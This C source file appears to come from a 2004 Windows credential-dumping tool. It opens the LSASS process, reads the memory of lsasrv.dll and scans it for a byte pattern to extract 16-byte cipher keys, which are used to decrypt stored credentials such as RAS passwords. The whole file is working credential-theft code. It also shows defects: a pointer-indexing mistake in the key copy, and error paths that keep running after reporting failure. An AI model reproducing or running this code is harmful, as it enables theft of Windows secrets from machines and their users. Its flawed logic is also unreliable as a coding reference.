/*
 *  Copyright (C) 2004  Arnaud Pilon
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include "getpid.h"

#pragma comment( lib, "psapi.lib" )
#pragma comment( lib, "advapi32.lib" )

extern VOID SendErrorMessage( HANDLE , CHAR *  );

static DWORD _getCipherKey( BYTE ** , HANDLE );

DWORD getCipherKey( BYTE * cipherKey, HANDLE hPiped ) 
{
	int * ptr, ret;
	BYTE * buf;

	ret = _getCipherKey( &buf, hPiped );
	ptr = (int *) &(buf[ 0 ]);
	memcpy(cipherKey, (unsigned char *) ptr, 0x10 );
	free( buf );

	return ret;
}

/**
 * This code is adapted from
 * http://www.xfocus.net/articles/200411/749.html
 * (ouch! Japanese language! Hoppefully, C is the programmer's Esperanto)
 * Originaly used to dump RAS password.
 * 
 * Credits: eyas[_@_]xfocus.org / eyas
 */
static DWORD _getCipherKey( BYTE ** ppKey, HANDLE hPiped )
{
    HANDLE    hLsass, hLsasrv;
    DWORD    i, dwAddr;
	SIZE_T	nbRead, dwRead;
    BYTE    *pImage = NULL;
    MODULEINFO    mod;
	DWORD pid = 724;
    BOOL    bRet = FALSE;
    DWORD    dwCount = 0, dwMaxCount=100;

    hLsasrv = LoadLibrary( "lsasrv.dll" );
	if ( hLsasrv == NULL ) {
		SendErrorMessage( hPiped, "Unable to LoadLibrary lsasrv.dll" );
	}

	if ( ! GetModuleInformation( GetCurrentProcess(), (HMODULE) hLsasrv, 
		&mod, sizeof( mod ) ) ) {
		SendErrorMessage( hPiped, "Unable to GetModuleInformation" );
	}

	if ( !find_pid( &pid ) ) {
		SendErrorMessage( hPiped, "Unable to find LSASS pid." );
	}

	if ( ( hLsass = OpenProcess( PROCESS_VM_READ, FALSE, pid ) ) == NULL ) {
		SendErrorMessage( hPiped, "Unable to open LSASS.EXE process" );
	}


    pImage = ( BYTE * ) malloc( mod.SizeOfImage );
    if ( ! ReadProcessMemory(hLsass, (BYTE*) hLsasrv, pImage,
		mod.SizeOfImage - 0x10, &nbRead ) ) {
		SendErrorMessage( hPiped, "Failed to read LSASS memory." );
	}

    *ppKey = ( BYTE * ) malloc( dwMaxCount*0x10 );

	__try {
		for( i = 0 ; i < nbRead ; i++ ) {
            if( memcmp( &pImage[i], "\x10\x00\x00\x00\x10\x00\x00\x00", 8 ) == 0 ) {
                dwAddr = *( DWORD * )( &pImage[i+8] );
                if( ReadProcessMemory( hLsass, ( LPCVOID ) dwAddr, 
                            &(*ppKey[dwCount*0x10]), 0x10, &dwRead ) ) {
					dwCount++;
                } else { 
				//	SendErrorMessage( hPiped, "Failed to read LSASS memory." );
				}
            }
        }
    } __except( EXCEPTION_EXECUTE_HANDLER )  {
		// ok, it is bit ugly...
	}

  return dwCount;
}
